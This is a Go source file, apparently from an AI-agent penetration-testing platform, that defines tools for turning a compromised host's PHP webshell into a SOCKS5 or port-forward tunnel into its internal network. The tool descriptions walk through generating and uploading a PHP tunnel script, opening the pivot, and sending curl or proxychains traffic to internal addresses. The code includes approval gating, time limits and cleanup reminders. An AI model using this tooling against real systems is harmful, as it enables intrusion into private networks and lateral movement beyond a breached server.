package agent

// WebShell 隧道工具：把「只有一句话马、没开 22」的目标变成 SOCKS5 内网出口。
//
// 与 pivot_*（SSH direct-tcpip）互补，不是替代：
//   - pivot_* 要求目标开 22 且有凭据；本组只要目标能跑 PHP（已有 webshell）。
//   - 两者都产出 SOCKS5 入口，下游 curl/proxychains 用法一致。
//
// 三步流程（顺序不能乱，token 是纽带）：
//  1. webshell_tunnel_script  → 拿到带随机 token 的 PHP 脚本全文
//  2. webshell_upload（或任意落地手段）→ 把脚本写到目标 Web 目录，记下 URL
//  3. webshell_pivot_open(session, tunnel_url, token) → 开 SOCKS5 隧道
//
// token 是平台与脚本之间的浅校验（防同目录误访问），不是鉴权；它不进任何列表、
// fact 或报告。脚本是明文 PHP 临时文件，webshell_remove(remove_remote=true) 清理。
//
// 审批语义与 pivot_open 一致：开隧道走拦截规则 ask（对内网的长期入口），
// list/close 不拦（只读 / 收缩暴露面）。

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/chu0119/pojun/webshell"

	actool "github.com/Autumn-27/norma/tool"
)

// 隧道依赖经 Runtime 取（见 runtime.go）；取不到时报「未启用」而不是 panic。

// SetWebShellTunnelManager wires the process-wide webshell tunnel manager.
func SetWebShellTunnelManager(m *webshell.TunnelManager) {
	setDefaultRuntime(func(r *Runtime) { r.WebShellTunnel = m })
}

func (t *ToolSet) wsTunnelUnavailable() (actool.Result, bool) {
	if t.rtShell() == nil || t.rtShellTunnel() == nil {
		return actool.Errorf("WebShell 隧道未启用（服务端未初始化 webshell / tunnel manager）"), true
	}
	return actool.Result{}, false
}

// webshellTunnelScript 生成带 token 的隧道脚本。
func (t *ToolSet) webshellTunnelScript() actool.CoreTool {
	return readTool(
		"webshell_tunnel_script",
		"(WebShell)生成一段 PHP 隧道脚本全文和一个随机 token，用于把只有一句话马、没开 22 的目标变成 SOCKS5 内网出口。\n"+
			"三步流程：① 本工具拿脚本+token → ② webshell_upload 把脚本写到目标 Web 目录（或任意已掌握的写入手段），记下可访问的 URL → "+
			"③ webshell_pivot_open(session, tunnel_url, token) 开隧道。\n"+
			"token 是平台与脚本之间的浅校验（防同目录他人误访问），open 时必须传脚本里同一个。\n"+
			"原理：脚本在一次 HTTP 长连接里持有到内网目标的 TCP socket，平台用它搬任意 TCP 流量——不需要目标开 SSH，也不用落二进制。\n"+
			"注意：脚本是明文 PHP 临时文件，用完务必 webshell_remove(remove_remote=true) 清理（把脚本路径加进会话 artifacts）。",
		obj(map[string]any{}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsTunnelUnavailable(); bad {
				return r, nil
			}
			token := webshell.NewTunnelToken()
			out, _ := json.MarshalIndent(map[string]any{
				"ok":        true,
				"token":     token,
				"script":    webshell.TunnelPHPScript(token),
				"file_hint": "tunnel_" + token[:6] + ".php",
				"next": "把 script 写到目标 Web 目录（webshell_upload 或任意写入手段），" +
					"URL 要能从平台访问到；然后 webshell_pivot_open(name=会话名, tunnel_url=<脚本URL>, token=<本token>)。",
				"warning": "脚本落地后是明文 PHP，任何人访问该 URL 并用对 token 都能用它打内网。" +
					"用完立即清理；不要落在公开可猜的路径。",
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellPivotUsage 生成下游用法提示。
func webshellPivotUsage(t *webshell.Tunnel) string {
	if t.Mode == webshell.ModeSocks {
		addr := t.Listen
		if t.HasAuth {
			return fmt.Sprintf("SOCKS5 入口 %s（需认证，见 socks_url）。例：curl --socks5-hostname %s http://10.0.0.9/\n"+
				"注意：本机 NO_PROXY 若覆盖目标地址会让 curl 忽略 --socks5-hostname，加 --noproxy \"\" 强制走隧道。", addr, addr)
		}
		return fmt.Sprintf("SOCKS5 入口 %s。例：curl --socks5-hostname %s http://10.0.0.9/\n"+
			"注意：本机 NO_PROXY 若覆盖目标地址会让 curl 忽略 --socks5-hostname，加 --noproxy \"\" 强制走隧道。", addr, addr)
	}
	return fmt.Sprintf("端口转发入口 %s → %s。直接连本地这个端口即可。", t.Listen, t.Target)
}

// webshellPivotOpen 开隧道。
func (t *ToolSet) webshellPivotOpen() actool.CoreTool {
	return writeTool(
		"webshell_pivot_open",
		"(WebShell)在已登记的会话上开一条 SOCKS5/端口转发隧道，把目标内网变成可访问的网络出口。\n"+
			"前提：先用 webshell_tunnel_script 拿脚本+token，把脚本写到目标 Web 目录并能从平台访问到。\n"+
			"本工具只建通道，不碰目标上的 socket 实现——真正的 TCP 连接由目标端脚本在它那次 HTTP 请求里持有。\n"+
			"session 必须属于当前任务；tunnel_url 和 token 必须对应同一份脚本。\n"+
			"**优先用 pivot_deploy(kind=webshell)**：它在开完后经 SOCKS5 实测目标可达性、失败自动回滚。\n"+
			"本工具只建通道、不验证「脚本能否到内网」——ping/pong 只证明平台与脚本之间通。\n"+
			"开隧道走审批（对内网的长期入口）。默认 TTL 2 小时自动关；用完必须 webshell_pivot_close。",
		obj(map[string]any{
			"name":       str("WebShell 会话名（webshell_list 查）。出口代理与自定义 header 从它继承。"),
			"tunnel_url": str("目标端隧道脚本的可访问 URL（http(s)://），例：http://10.0.0.5/uploads/tunnel_abc123.php"),
			"token":      str("webshell_tunnel_script 返回的 token，必须与落到目标上的脚本一致。"),
			"mode": map[string]any{
				"type": "string", "default": "socks",
				"description": "socks（默认，任意内网目标）/ portfwd（固定转发到单个 host:port）。",
			},
			"target": map[string]any{"type": "string", "description": "portfwd 模式必填：最终访问的内网 host:port。"},
			"label":  map[string]any{"type": "string", "description": "用途标注，例：DMZ 内网出口。"},
			"ttl_minutes": map[string]any{
				"type": "integer", "default": 120,
				"description": "存活分钟数（默认 120，上限 480）。到期自动关闭。",
			},
			"socks_user": map[string]any{"type": "string", "description": "SOCKS5 入口认证用户名（绑定非回环时必填）。"},
			"socks_pass": map[string]any{"type": "string", "description": "SOCKS5 入口认证口令。"},
			"bind_host": map[string]any{
				"type": "string", "default": "127.0.0.1",
				"description": "入口绑定地址。默认只绑回环；填 0.0.0.0 必须同时给 socks_user/socks_pass。",
			},
		}, "name", "tunnel_url", "token"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsTunnelUnavailable(); bad {
				return r, nil
			}
			var p struct {
				Name       string `json:"name"`
				TunnelURL  string `json:"tunnel_url"`
				Token      string `json:"token"`
				Mode       string `json:"mode"`
				Target     string `json:"target"`
				Label      string `json:"label"`
				TTLMinutes int    `json:"ttl_minutes"`
				SocksUser  string `json:"socks_user"`
				SocksPass  string `json:"socks_pass"`
				BindHost   string `json:"bind_host"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			ttl := time.Duration(p.TTLMinutes) * time.Minute
			if ttl <= 0 {
				ttl = webshell.DefaultTTL
			}
			tun, err := t.rtShellTunnel().Open(ctx, webshell.TunnelOptions{
				TaskID: t.taskID, Session: p.Name, TunnelURL: p.TunnelURL, Token: p.Token,
				Mode: p.Mode, Target: p.Target, Label: p.Label, TTL: ttl,
				BindHost: p.BindHost, SocksUser: p.SocksUser, SocksPass: p.SocksPass,
			})
			if err != nil {
				return actool.Errorf("开 WebShell 隧道失败: " + err.Error()), nil
			}
			v := tun.View(0)
			out, _ := json.MarshalIndent(map[string]any{
				"ok": true, "tunnel": v, "usage": webshellPivotUsage(tun),
				"next": "隧道已可用。拿 SOCKS5 地址去 curl / proxychains 打内网；" +
					"打完记得 webshell_pivot_close，并清理目标上的隧道脚本。",
				"warning": "WebShell 隧道的每条连接都是一次 HTTP 请求，延迟高于 SSH 隧道；" +
					"适合低带宽交互（内网 Web/服务探测），不适合大流量传输。",
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellPivotList 列出隧道。
func (t *ToolSet) webshellPivotList() actool.CoreTool {
	return readTool(
		"webshell_pivot_list",
		"(WebShell)列出本任务的 WebShell 隧道（含剩余 TTL、channel 数、上下行字节、最近连接目标与错误）。\n"+
			"排查「经隧道打不通」时看 last_error 与 recent：脚本失效会体现在探测失败，目标端口不通会体现在 STATUS 失败原因。",
		obj(map[string]any{
			"all_tasks": map[string]any{"type": "boolean", "description": "true = 看所有任务（默认只看本任务）。"},
			"recent":    map[string]any{"type": "integer", "description": "每条附带最近 N 条连接记录（默认 3，上限 20）。"},
		}),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsTunnelUnavailable(); bad {
				return r, nil
			}
			var p struct {
				AllTasks bool `json:"all_tasks"`
				Recent   int  `json:"recent"`
			}
			_ = json.Unmarshal(in, &p)
			if p.Recent <= 0 {
				p.Recent = 3
			}
			if p.Recent > 20 {
				p.Recent = 20
			}
			taskID := t.taskID
			if p.AllTasks {
				taskID = 0
			}
			items := make([]webshell.TunnelView, 0)
			for _, tun := range t.rtShellTunnel().List(taskID) {
				items = append(items, tun.View(p.Recent))
			}
			out, _ := json.MarshalIndent(map[string]any{
				"items": items, "count": len(items), "stats": t.rtShellTunnel().Stats(),
			}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}

// webshellPivotClose 关闭隧道。
func (t *ToolSet) webshellPivotClose() actool.CoreTool {
	return writeTool(
		"webshell_pivot_close",
		"(WebShell)关闭一条 WebShell 隧道。关闭后 SOCKS5 入口立即不可连，目标端 channel 随之释放。\n"+
			"跨任务的隧道不能关（拒绝后隧道仍在）。close 幂等语义：重复关报不存在。\n"+
			"用完务必关——留着的隧道就是对内网的长期开放入口。关掉后记得清理目标上的隧道脚本。",
		obj(map[string]any{
			"id": str("要关闭的隧道 id（webshell_pivot_list 查）。"),
		}, "id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			if r, bad := t.wsTunnelUnavailable(); bad {
				return r, nil
			}
			var p struct {
				ID string `json:"id"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			id := strings.TrimSpace(p.ID)
			if id == "" {
				return actool.Errorf("缺少 id"), nil
			}
			// 任务归属校验：只能关本任务的隧道。
			tun, ok := t.rtShellTunnel().Get(id)
			if !ok {
				return actool.Errorf(fmt.Sprintf("隧道 %s 不存在", id)), nil
			}
			if t.taskID > 0 && tun.TaskID != t.taskID {
				return actool.Errorf(fmt.Sprintf("隧道 %s 属于别的任务，不能跨任务关闭", id)), nil
			}
			if err := t.rtShellTunnel().Close(id); err != nil {
				return actool.Errorf("关闭失败: " + err.Error()), nil
			}
			out, _ := json.MarshalIndent(map[string]any{"ok": true, "closed": id}, "", "  ")
			return actool.Text(string(out)), nil
		},
	)
}
